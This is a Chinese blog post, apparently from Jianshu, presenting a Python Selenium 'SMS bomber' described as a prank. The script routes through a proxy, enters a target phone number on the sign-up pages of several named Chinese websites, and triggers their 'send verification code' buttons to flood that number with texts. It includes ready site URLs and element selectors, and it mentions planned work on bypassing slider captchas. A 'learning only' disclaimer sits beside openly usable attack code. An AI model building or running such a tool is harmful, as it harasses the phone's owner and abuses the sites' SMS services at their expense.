最近一直在琢磨写一个有点烦人的小爬虫，结果琢磨着，就花了一点点时间，写了这样一个“不友好”的，被许多人讨厌的爬虫😂：频繁收取短信验证码的‘坏’程序，姑且称为是生活中的一个"小恶作剧"吧。
对不起啦🙈，对那些老被我获取验证码的网站（🙈并非有意要增加你们维护网站的成本💦）。

**【备注】：此小程序仅用做技术探究学习，🚫不可用于侵犯他人利益**。

```
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
# 设置代理
proxy = '220.191.64.149'
chrome_options = Options()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--proxy-server = http://' + proxy)

broswer = webdriver.Chrome()
# 测试代理
# broswer.get('http://httpbin.org/get')

# 输入即将收到短信的手机号码
tel = 

# 定位,并输入手机号码
def tel_num_try(input_tel):
    print("【目前状态】：\n定位号码输入框,并输入手机号码...")
    try:
        print("使用id定位中...")
        bot1=broswer.find_element_by_id(input_tel)
        bot1.send_keys(tel)
    except:
        print("【id定位失败！】：\n使用class_name定位中...")
        bots2 = broswer.find_element(By.CLASS_NAME, input_tel)
        time.sleep(1)
        bots2.send_keys(tel)

# 定位并点击(方案1)
def tel_power_try_child1(btn):
    print("【当前状态】:定位元素，点击鼠标..")
    try:
        print("使用id定位中...")
        bot3 = broswer.find_element_by_id(btn)
        # bot1 = broswer.find_element_by_css_selector(btn)
        bot3.click()
        time.sleep(1)
    except Exception as e:
        print("【id定位失败！】\n 使用by_xpath定位中...")
        bots4 = broswer.find_element_by_xpath(btn)
        bots4.click()
        time.sleep(1)

# 定位并点击(方案2)
def tel_power_try_child2(btn):
    print("【当前状态】:定位元素，点击鼠标..")
    try:
        print("使用id定位中...")
        bot3 = broswer.find_element_by_id(btn)
        # bot1 = broswer.find_element_by_css_selector(btn)
        bot3.click()
        time.sleep(1)
    except:
        print("【id定位失败！】\n使用CSS_SELECTOR定位中...")
        bots4 = broswer.find_element(By.CSS_SELECTOR, btn)
        bots4.click()
        time.sleep(1)

# 调用两个点击方案
def tel_power_try(btn):
    try:
        tel_power_try_child1(btn)
    except:
        tel_power_try_child2(btn)

# 模板：两步获取验证码：手机号定位，验证码定位；
def tel_get_2(url,input_tel,btn):
    # 获取地址
    broswer.get(url)
    # 定位手机号输入
    tel_num_try(input_tel)
    # 定位"获取验证码"按钮
    tel_power_try(btn)

# 模板：三步获取验证码：into：登录定位，input_tel：手机号定位，btn：验证码定位；
def tel_get_3(url,into,input_tel,btn):
    # 获取地址
    broswer.get(url)
    tel_power_try(into)

    # 定位手机号输入
    tel_num_try(input_tel)

    # 定位"获取验证码"按钮
    tel_power_try(btn)

# 模板：三步获取验证码：登录定位，手机号定位，验证码定位；
def tel_get_k3(url,into,input_tel,btn):
    # 获取地址
    broswer.get(url)
    # 定位手机号输入
    tel_num_try(input_tel)
    tel_power_try(into)

    # 定位"获取验证码"按钮
    tel_power_try(btn)

# 模板：三步获取验证码：手机定位，滑动验证码检验（变速滑动）、验证码定位；（待续）

# 模板：三步获取验证码：手机定位，图像文字识别检验（涉及太广）、验证码定位；（待续）
```
【解释一下】：对验证码的获取，不同的网页有不同的方式，但总结下来，主要分为以下几种：
- 两步获取验证码：手机号定位，验证码定位；
- 三步获取验证码：into：登录注册界面定位；input_tel：定位手机号输入框；btn：验证码按钮定位；
- 三步获取验证码：手机定位；滑动验证码检验（变速滑动）；验证码按钮定位；
- 三步获取验证码：手机定位，图像文字识别检验、验证码定位；（此块内容涉及知识面太广，暂时不做考究）；

下面以苏宁易购为例，（界面做的蛮好看的，点个赞）讲述一下大致的短信获取的步骤。
- 第一步：在进入注册成为新用户之前，我们要先点击【同意并继续】的按钮，当然，关于如何寻找并定位这个元素，可以通过开发者工具，然后找到此元素的（class_name、id）等一系列的可以定位此元素的属性，然后使用selenium库模拟鼠标点击按钮即进入下一步； 

![以苏宁易购为例](https://upload-images.jianshu.io/upload_images/17476267-16dd0338701f78fa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

- 第二步：
同第一步一样，通过开发者工具定位元素，使用selenium库模拟输入手机号码即可。
![定位手机号输入框](https://upload-images.jianshu.io/upload_images/17476267-6bc7e0a70ae72706.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

- 第三步：
同第二步一样，通过开发者工具定位元素，使用selenium库模拟点击【获取验证码】即可。
![第三步](https://upload-images.jianshu.io/upload_images/17476267-280ceeeff7c46c8a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)

【后续 程序如下】：
```
# 短信轰炸机：感觉自己在犯法的边缘不断试探
class Spider_tel():
    def __init__(self):
        pass

    def TongCheng_com(self):
        url = "https://passport.58.com/reg/?path=https%3A//gz.58.com/&PGTID=0d100000-0000-33f9-63ec-9ca2641f5e25&ClickID=3"
        input_tel = 'phone'
        btn = '.getcode'
        print('【TongCheng_com】')
        tel_get_2(url,input_tel,btn)

    def Guazi_com(self):
        url = "https://www.guazi.com/qinhuangdao/dazhong/"
        into = 'js-login-new'
        input_tel = "phone-login-input"
        btn = '.get-code'
        print('【Guazi_com】')
        tel_get_3(url,into, input_tel, btn)

    def JianShu(self):
        url = "https://www.jianshu.com/sign_up"
        input_tel = 'user_mobile_number'
        btn = 'send_code'
        print('【JianShu】')
        tel_get_2(url,input_tel,btn)

    def SuNingYiGou(self):
        url = "https://reg.suning.com/person.do?myTargetUrl=https%3A%2F%2Fwww.suning.com%2F%3Fsafp%3Dd488778a.uzD.0.acf325284e"
        into = '.agree-btn'
        input_tel = "mobileAlias"
        btn = 'sendSmsCode'
        print('【SuNingYiGou】')
        tel_get_3(url,into, input_tel, btn)

    def FanKe(self):
        url = "https://www.fkw.com/reg.html"
        input_tel = 'acct'
        btn ='.button'
        print('【FanKe】')
        tel_get_2(url,input_tel,btn)

    def WangyiYun(self):
        # 难啃系数3颗星
        url = "https://id.163yun.com/register?referrer=https://dun.163.com/dashboard&h=yd&"
        into = ".yidun_intelli-text"
        input_tel = "m-input"
        btn = '.m-btn'
        print('【WangyiYun】')
        tel_get_k3(url,into, input_tel, btn)

    def BeiRui(self):
        url = 'https://console.oray.com/passport/register.html?fromurl=http%3A%2F%2Fdomain .oray.com%2F'
        into = '//*[@id="tips-protocol-win"]/div/div/div/div[2]/p/ input[1]'
        input_tel = "mobile"
        btn = "re-get"
        print('【BeiRui】')
        tel_get_3(url,into, input_tel, btn)

    def XueJia(self):
        url = "https://cn.student.com/au/adelaide?utm_source=baidu&utm_medium=cpc&utm_campaign=3_destination_au_pc&utm_content=3_adelaide_g_web_p&utm_term=adelaide%E7%A7%9F%E6%88%BF%E7%BD%91#sign-up"
        input_tel = 'input-field__input'
        btn ='.send-button__text'
        print('【XueJia】')
        tel_get_2(url,input_tel,btn)

    def run(self):
        pass
        # self.TongCheng_com()
        # self.Guazi_com()
        # self.JianShu()
        # self.FanKe()    #需要滑块验证(留待解决)
        # self.SuNingYiGou()
        # self.WangyiYun()
        # self.BeiRui()
        # self.XueJia()

s = Spider_tel()
s.run()
```

【结语】：作者仅出于学习爬虫的初衷，分享本文，如有问题，欢迎留言。
